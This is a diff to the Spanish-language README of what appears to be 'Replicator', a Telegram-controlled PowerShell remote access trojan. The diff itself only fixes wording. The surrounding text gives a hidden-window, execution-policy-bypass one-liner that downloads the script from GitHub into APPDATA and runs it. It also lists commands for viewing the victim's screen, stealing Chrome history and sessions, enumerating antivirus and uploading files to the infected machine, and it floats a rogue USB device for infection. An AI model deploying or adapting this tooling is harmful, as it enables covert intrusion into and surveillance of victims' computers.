@@ -8,8 +8,8 @@ Requiere crear un bot de Telegram. Con esto obtienes un API_TOKEN y un CHAT_ID.
 powershell -EP Bypass -WindowStyle hidden "(iwr 'https://raw.githubusercontent.com/josprou/Replicator/main/Replicator.ps1').content > $env:APPDATA\aaa.ps1 ; & $env:APPDATA\aaa.ps1 'API_TOKEN' 'CHAT_ID'"
 
 # Comandos
-- avs: Enumera los antivirus del host
-- bar: Sirve para calibrar el agente
+- avs: enumera los antivirus del host
+- bar: sirve para calibrar el agente
 - chat: inicia un chat con el usuario del equipo infectado
 - checkports: escaneo de puertos
 - crhome: obtiene el historia de navegación de chrome
@@ -27,8 +27,8 @@ powershell -EP Bypass -WindowStyle hidden "(iwr 'https://raw.githubusercontent.c
 - run: corre un proceso
 - screen: visualiza la pantalla de la victima
 - sessions: obtiene las sesiones abiertas en el sistema
-- speak: di un mensaje con voz de robot en ele quipo de la víctima
-- upload: sube ficheros al infectado
+- speak: di un mensaje con voz de robot en el equipo de la víctima
+- upload: sube ficheros al sistema comprometido
 
 # Ideas
 Integrar con un ATTiny85 (https://www.amazon.es/dp/B076KS2QDS?ref=ppx_yo2ov_dt_b_fed_asin_title&th=1) para comprometer equipos pinchando un usb.
